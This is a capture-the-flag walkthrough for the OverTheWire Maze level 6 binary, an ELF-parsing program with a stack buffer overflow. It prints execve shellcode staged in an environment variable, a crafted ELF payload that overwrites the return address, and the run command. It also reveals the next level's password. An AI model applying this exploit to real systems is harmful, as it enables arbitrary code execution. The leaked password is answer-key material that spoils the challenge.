
---
**Challenge URL:** [Maze Wargame](https://overthewire.org/wargames/)

---

### 🔐 Level Goal:

> This binary reads ELF header data and calls a custom `Print_Shdrs()` function to dump section headers. The vulnerability lies in how it reads into a **stack-based buffer without bounds checking**, leading to a **classic stack buffer overflow** — which we’ll exploit to hijack execution flow.

---

### 🧠 Concepts Covered:

- 🧠 ELF header structure: `Elf32_Ehdr`, `Elf32_Shdr`
    
- 🧨 Buffer overflow via unsafe `read()`
    
- 🐚 Shellcode via environment variable
    
- 📦 Stack manipulation and return address control
    

---

### 🔎 Decompiled Summary

In `main()`:

```c
read(fd, &ehdr, 52); // Read ELF header
Print_Shdrs(fd, ehdr.e_shoff, ehdr.e_shstrndx, ehdr.e_shnum, ehdr.e_shentsize);
```

Inside `Print_Shdrs()`:

```c
char *p = &dummy;        // dummy is char dummy[64];
...
read(fd, p, size);       // 🧨 size is user-controlled — unsafe!
```

→ If we pass a file with `e_shentsize = 0x44`, it will cause the `read()` to overflow the dummy buffer (64 bytes) and **overwrite the return address**.

---

### 🧪 Strategy

1. Place shellcode in an environment variable
    
2. Craft ELF file with:
    
    - Padding for 44-byte overflow
        
    - Overwritten return address pointing to shellcode
        
3. Pass it to the binary
    

---

### ⚙️ Step-by-Step Exploit

#### 📜 1. Export shellcode in environment

```bash
export SC=$(python3 -c 'print("\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68" \
"\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")')
```

📌 Shellcode address = `0xffffdf0c`

---

#### 📜 2. Create payload ELF file

```bash
python3 -c '
print(
    "\x00"*32 +               # padding
    "\x00\x00\x00\x00" +      # shstrndx (0)
    "\x00"*10 + 
    "\x44\x00" +              # e_shentsize = 0x44
    "\x00\x00" +              # e_shnum = 0
    "\x00\x00\x00\x00" + 
    "\x00"*10 +
    "\x0c\xdf\xff\xff"        # Overwrite return addr → 0xffffdf0c
)' > /tmp/elf_payload
```

---

#### ▶️ 3. Run the Exploit

```bash
/maze/maze6 /tmp/elf_payload
```

→ The overflow causes return into our NOP sled → shell spawns 🐚

---

### 🔑 Password for Maze Level 7:

```
pohninieng
```

---
